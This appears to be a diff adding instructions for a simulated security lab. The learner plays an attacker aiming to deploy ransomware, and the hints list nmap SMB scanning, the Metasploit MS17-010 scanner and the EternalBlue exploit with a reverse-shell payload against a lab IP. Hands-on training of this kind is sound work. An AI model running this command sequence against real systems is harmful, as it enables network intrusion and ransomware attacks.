@@ -1,0 +1,15 @@
+In this lab, you'll step into the role of an attacker aiming to compromise a small organization's network to deploy ransomware, using a WiFi-connected terminal.<br/>
+Follow these hints:
+<ul>
+<li>Use the <code style="color: rgb(255, 215, 0);">help</code> command to see all available commands.
+<li>The vulnerable machine's IP is <code style="color: rgb(255, 215, 0);">192.168.1.103</code>.
+<li>Begin with <code style="color: rgb(255, 215, 0);">nmap -p 139,445 192.168.1.0/24</code> to scan for open SMB ports.
+<li>Launch Metasploit with <code style="color: rgb(255, 215, 0);">msfconsole</code>, then use <code style="color: rgb(255, 215, 0);">use auxiliary/scanner/smb/smb_ms17_010</code>.
+<li>Set the target with <code style="color: rgb(255, 215, 0);">set RHOST 192.168.1.103</code> and exploit with <code style="color: rgb(255, 215, 0);">run</code>.
+<li>Further exploit with <code style="color: rgb(255, 215, 0);">use exploit/windows/smb/ms17_010_eternalblue</code>, set payload with <code style="color: rgb(255, 215, 0);">set payload generic/shell_reverse_tcp</code>, and execute with <code style="color: rgb(255, 215, 0);">exploit</code>.<br>
+</ul>
+Learn more about the commands being utilized:
+<ul>
+<li><a href="https://nmap.org/docs.html" style="color: rgb(255, 215, 0);">Nmap Documentation</a>
+<li><a href="https://www.metasploit.com/documentation" style="color: rgb(255, 215, 0);">Metasploit Documentation</a>
+</ul>
